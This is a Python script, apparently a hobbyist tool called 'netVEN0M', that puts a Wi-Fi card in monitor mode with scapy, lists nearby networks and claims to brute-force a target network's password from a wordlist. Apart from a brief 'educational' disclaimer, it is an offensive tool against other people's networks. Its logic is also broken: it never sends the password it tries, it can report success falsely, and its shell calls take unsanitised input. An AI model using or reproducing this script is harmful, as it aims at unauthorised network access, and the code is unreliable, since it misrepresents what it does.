from scapy.all import *
import threading
import time
import os

banner = r'''
                                                                                                
                                                                                                
                               ||   / /     //   / /     /|    / /      ___        /|    //| | 
     __        ___     __  ___ ||  / /     //____       //|   / /     //   ) )    //|   // | | 
  //   ) )   //___) )   / /    || / /     / ____       // |  / /     //   / /    // |  //  | | 
 //   / /   //         / /     ||/ /     //           //  | / /     //   / /    //  | //   | | 
//   / /   ((____     / /      |  /     //____/ /    //   |/ /     ((___/ /    //   |//    | | 

netVEN0M by root0emir

It is for educational purposes only; please do not use it for unethical activities.
'''
print(banner)

networks = {}

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        ssid = pkt[Dot11Elt].info.decode()
        bssid = pkt[Dot11].addr2
        channel = int(ord(pkt[Dot11Elt:3].info))
        if bssid not in networks:
            networks[bssid] = {'ssid': ssid, 'channel': channel}
            print(f"\033[1;34m[+] Found Network:\033[0m SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")

def scan_networks(interface):
    print("\033[1;34m[*] Scanning for Wi-Fi networks...\033[0m")
    sniff(iface=interface, prn=packet_handler, timeout=30)

    if not networks: 
        print("\033[1;31m[!] No Wi-Fi networks found.\033[0m")
    else:
        print(f"\033[1;34m[+] Total {len(networks)} networks found.\033[0m")

def brute_force(bssid, interface, wordlist):
    print(f"\033[1;34m[*] Starting brute-force on {bssid}...\033[0m")
    
    with open(wordlist, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        print(f"[-] Trying password: {password}")
        
        auth_pkt = RadioTap()/Dot11(addr1=bssid, addr2=RandMAC(), addr3=bssid)/Dot11Auth(seqnum=1, algo=0, status=0)
        sendp(auth_pkt, iface=interface, verbose=0)
        
        time.sleep(0.1) 

        ans, _ = sniff(iface=interface, count=1, timeout=5) 
        for pkt in ans:
            if pkt.haslayer(Dot11Auth) and pkt[Dot11].addr3 == bssid:
                if pkt[Dot11Auth].status == 0:  
                    print(f"\033[1;32m[+] Success! Password found: {password}\033[0m")
                    return  
                else:
                    print(f"[!] Authentication failed for password: {password}")

    print("\033[1;31m[!] Brute-force attack completed. Password not found.\033[0m")

def main():
    interface = input("Enter your wireless interface (e.g., wlan0): ") 

    # Monitor mode settings
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")

    # Network scan
    scan_networks(interface)

    target_bssid = input("Enter BSSID of target network: ")
    wordlist = input("Enter path to password wordlist file: ")

    if not os.path.exists(wordlist):
        print("\033[1;31m[!] Error: Wordlist file not found.\033[0m")
        sys.exit(1)

    # Brute-force attack
    brute_force(target_bssid, interface, wordlist)

    
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type managed")
    os.system(f"sudo ip link set {interface} up")

if __name__ == "__main__":
    main()
